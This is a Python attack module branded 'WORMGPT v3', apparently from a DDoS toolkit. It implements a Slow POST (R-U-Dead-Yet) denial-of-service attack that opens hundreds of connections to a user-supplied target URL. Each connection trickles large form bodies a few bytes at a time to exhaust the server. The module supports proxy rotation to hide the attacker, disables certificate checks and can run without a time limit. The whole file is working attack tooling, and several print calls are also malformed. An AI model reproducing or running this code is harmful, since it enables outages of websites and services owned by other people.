#!/usr/bin/env python3
"""
/AXMODS/DDOS/attack_method/slow_post.py
SLOW POST ATTACK MODULE - WORMGPT v3
R-U-Dead-Yet (RUDY) Implementation
"""

import socket
import ssl
import random
import threading
import time
import sys
import os
from urllib.parse import urlparse

class SlowPOST:
    def __init__(self, target, port=80, connections=200, duration=0, proxy=False):
        """
        Initialize Slow POST Attack
        
        Args:
            target: Target URL
            port: Target port
            connections: Number of concurrent connections
            duration: Attack duration in seconds (0=infinite)
            proxy: Use proxy rotation
        """
        self.target = target
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = port
        self.connections = connections
        self.duration = duration
        self.use_proxy = proxy
        
        self.is_attacking = True
        self.active_connections = 0
        self.start_time = time.time()
        
        # User Agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ]
        
        # Form field names for POST data
        self.field_names = [
            'username', 'email', 'password', 'confirm_password',
            'first_name', 'last_name', 'address', 'city',
            'zip_code', 'country', 'phone', 'message',
            'comment', 'subject', 'content', 'title'
        ]
        
        # Proxies
        self.proxies = []
        if proxy:
            self.load_proxies()
        
        # SSL context for HTTPS
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Lock for thread-safe operations
        self.lock = threading.Lock()
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
        except:
            pass
    
    def create_socket(self):
        """Create and connect a socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Use proxy if available
            if self.use_proxy and self.proxies:
                proxy = random.choice(self.proxies)
                proxy_host, proxy_port = proxy.split(':')
                sock.connect((proxy_host, int(proxy_port)))
                
                # For HTTPS, we need to send CONNECT request first
                if self.parsed_url.scheme == 'https':
                    connect_request = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
                    sock.send(connect_request.encode())
                    response = sock.recv(4096)
                    if b'200' not in response:
                        raise Exception("Proxy CONNECT failed")
            else:
                sock.connect((self.host, self.port))
            
            # Wrap with SSL if HTTPS
            if self.parsed_url.scheme == 'https':
                if self.use_proxy and self.proxies:
                    # Already connected via proxy, just wrap
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
                else:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
            
            return sock
        except Exception as e:
            return None
    
    def generate_post_headers(self, content_length):
        """Generate POST request headers"""
        path = random.choice(['/contact', '/submit', '/post', '/form', '/api/submit'])
        
        headers = [
            f"POST {path} HTTP/1.1",
            f"Host: {self.host}",
            f"User-Agent: {random.choice(self.user_agents)}",
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            f"Accept-Language: en-US,en;q=0.5",
            f"Accept-Encoding: gzip, deflate",
            f"Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {content_length}",
            f"Connection: keep-alive",
            f"Cache-Control: no-cache",
            f"\r\n"
        ]
        
        return '\r\n'.join(headers)
    
    def generate_form_data(self, total_size):
        """Generate form data of specified size"""
        # Create a large form data string
        data_parts = []
        remaining_size = total_size
        
        while remaining_size > 0:
            field = random.choice(self.field_names)
            # Generate value with random length
            value_length = min(random.randint(10, 100), remaining_size - len(field) - 1)
            if value_length <= 0:
                break
            
            value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=value_length))
            data_parts.append(f"{field}={value}")
            remaining_size -= len(field) + len(value) + 1
        
        return '&'.join(data_parts)[:total_size]
    
    def slow_post_connection(self, conn_id):
        """Manage a single Slow POST connection"""
        sock = None
        
        while self.is_attacking:
            # Check duration
            if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                break
            
            # Create socket if not exists
            if sock is None:
                sock = self.create_socket()
                if sock is None:
                    time.sleep(5)
                    continue
                
                with self.lock:
                    self.active_connections += 1
                
                # Generate POST data (large size, e.g., 1MB)
                content_length = random.randint(500000, 1000000)  # 0.5-1MB
                form_data = self.generate_form_data(content_length)
                
                # Send headers
                headers = self.generate_post_headers(content_length)
                
                try:
                    sock.send(headers.encode())
                    
                    # Send data VERY SLOWLY
                    bytes_sent = 0
                    chunk_size = random.randint(1, 100)  # Tiny chunks
                    
                    while bytes_sent < content_length and self.is_attacking:
                        if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                            break
                        
                        # Send a small chunk
                        chunk = form_data[bytes_sent:bytes_sent + chunk_size]
                        if not chunk:
                            break
                        
                        try:
                            sock.send(chunk.encode())
                            bytes_sent += len(chunk)
                        except:
                            break
                        
                        # Wait between chunks (this is the SLOW part)
                        time.sleep(random.uniform(10, 30))  # 10-30 seconds between chunks
                    
                except Exception as e:
                    pass
            
            # If socket is dead or we finished sending, wait and restart
            time.sleep(random.uniform(30, 60))
            
            # Close old socket and create new one
            if sock:
                try:
                    sock.close()
                except:
                    pass
                sock = None
                
                with self.lock:
                    self.active_connections -= 1
        
        # Cleanup
        if sock:
            try:
                sock.close()
            except:
                pass
        
        with self.lock:
            self.active_connections -= 1
    
    def start(self):
        """Start Slow POST attack"""
        print(f"\n[+] Starting SLOW POST attack")
        print(f"[+] Target: {self.target}")
        print(f"[+] Port: {self.port}")
        print(f"[+] Connections: {self.connections}")
        print(f"[+] Duration: {self.duration if self.duration > 0 else 'Infinite'} seconds")
        print(f("[+] Attack Type: R-U-Dead-Yet (RUDY)"))
        print(f"[+] Strategy: Slow HTTP POST with large content")
        print(f("[+] Press Ctrl+C to stop\n"))
        
        # Create connection threads
        threads = []
        for i in range(min(self.connections, 100)):  # Start with 100 initially
            thread = threading.Thread(target=self.slow_post_connection, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            time.sleep(0.1)  # Stagger creation
        
        # Gradually increase connections
        def gradual_connection_creator():
            time.sleep(15)
            remaining = self.connections - min(self.connections, 100)
            batch_size = 50
            
            for i in range(0, remaining, batch_size):
                if not self.is_attacking:
                    break
                
                batch = min(batch_size, remaining - i)
                for j in range(batch):
                    if not self.is_attacking:
                        break
                    
                    thread = threading.Thread(target=self.slow_post_connection, args=(100 + i + j,))
                    thread.daemon = True
                    threads.append(thread)
                    thread.start()
                    time.sleep(0.2)
                
                time.sleep(10)
        
        if self.connections > 100:
            gradual_thread = threading.Thread(target=gradual_connection_creator)
            gradual_thread.daemon = True
            gradual_thread.start()
        
        # Main monitoring loop
        try:
            while self.is_attacking:
                elapsed = time.time() - self.start_time
                
                if self.duration > 0 and elapsed >= self.duration:
                    break
                
                with self.lock:
                    active = self.active_connections
                
                sys.stdout.write(f"\r[+] Active connections: {active}/{self.connections} | Time: {elapsed:.1f}s")
                sys.stdout.flush()
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n[!] Stopping attack...")
        
        # Cleanup
        self.is_attacking = False
        time.sleep(5)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        print(f"\n[+] Attack completed")
        print(f"[+] Maximum connections: {self.connections}")
        print(f"[+] Total duration: {elapsed:.1f} seconds")
        print(f("[+] Attack method: Slow HTTP POST (RUDY)"))
        
        return {
            'max_connections': self.connections,
            'duration': elapsed,
            'attack_type': 'Slow POST (RUDY)'
        }

def main():
    """Standalone execution"""
    print("""
╔══════════════════════════════════════════════╗
║         SLOW POST ATTACK MODULE             ║
║         WORMGPT v3 - AXMods Team            ║
╚══════════════════════════════════════════════╝
""")
    
    # Get target from user
    target = input("[?] Target URL (http:// or https://): ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse port from URL
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    port = 443 if parsed.scheme == 'https' else 80
    
    # Get parameters
    try:
        connections = int(input("[?] Number of connections (default 200): ") or "200")
        duration = int(input("[?] Duration in seconds (0=infinite): ") or "0")
        use_proxy = input("[?] Use proxies? (y/N): ").lower() == 'y'
    except:
        print("[!] Invalid input, using defaults")
        connections = 200
        duration = 0
        use_proxy = False
    
    # Start attack
    attack = SlowPOST(target, port, connections, duration, use_proxy)
    attack.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
